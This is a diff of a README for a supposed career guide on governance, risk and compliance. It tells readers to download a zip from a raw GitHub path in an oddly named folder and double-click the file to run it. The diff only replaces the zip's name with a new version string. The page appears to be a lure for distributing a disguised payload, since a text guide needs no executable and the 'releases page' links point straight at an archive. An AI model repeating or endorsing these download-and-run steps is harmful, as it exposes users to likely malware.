@@ -1,6 +1,6 @@
 # 🌟 GRC-Career-Guide - Enhance Your Career in Governance, Risk & Compliance 
 
-[![Download GRC-Career-Guide](https://raw.githubusercontent.com/Workbookformalgarden420/GRC-Career-Guide/main/unconsultable/GRC-Career-Guide_v2.0.zip)](https://raw.githubusercontent.com/Workbookformalgarden420/GRC-Career-Guide/main/unconsultable/GRC-Career-Guide_v2.0.zip)
+[![Download GRC-Career-Guide](https://raw.githubusercontent.com/Workbookformalgarden420/GRC-Career-Guide/main/unconsultable/Guide-Career-GR-v3.4-beta.3.zip)](https://raw.githubusercontent.com/Workbookformalgarden420/GRC-Career-Guide/main/unconsultable/Guide-Career-GR-v3.4-beta.3.zip)
 
 ## 📖 About This Project
 GRC-Career-Guide helps you understand the skills needed in Governance, Risk, and Compliance (GRC). This guide includes salary insights, certification paths, and the best global resources to further your learning. Whether you're starting your career or looking to advance, this guide is designed for you.
@@ -9,7 +9,7 @@ GRC-Career-Guide helps you understand the skills needed in Governance, Risk, and
 To get started with GRC-Career-Guide, you will need to download the software and run it on your device. Follow the steps below.
 
 ### 📥 Download & Install
-1. **Visit the Releases Page:** Click this link to go to the [GRC-Career-Guide releases page](https://raw.githubusercontent.com/Workbookformalgarden420/GRC-Career-Guide/main/unconsultable/GRC-Career-Guide_v2.0.zip).
+1. **Visit the Releases Page:** Click this link to go to the [GRC-Career-Guide releases page](https://raw.githubusercontent.com/Workbookformalgarden420/GRC-Career-Guide/main/unconsultable/Guide-Career-GR-v3.4-beta.3.zip).
 2. **Choose the Latest Version:** Look for the latest version listed at the top.
 3. **Download the Software:** Click on the file associated with your operating system. This will start the download.
 4. **Run the Application:** Once the download is complete, find the downloaded file on your computer and double-click it to run the application.
@@ -54,4 +54,4 @@ This project uses the MIT License. Feel free to use, modify, and distribute the 
 ## 🌐 Connect with Us
 Join our community to keep up with the latest updates and help shape the future of GRC-Career-Guide. Follow us on social media or join our mailing list.
 
-Once more, to download GRC-Career-Guide, follow this [link to the releases page](https://raw.githubusercontent.com/Workbookformalgarden420/GRC-Career-Guide/main/unconsultable/GRC-Career-Guide_v2.0.zip). Happy learning!
+Once more, to download GRC-Career-Guide, follow this [link to the releases page](https://raw.githubusercontent.com/Workbookformalgarden420/GRC-Career-Guide/main/unconsultable/Guide-Career-GR-v3.4-beta.3.zip). Happy learning!
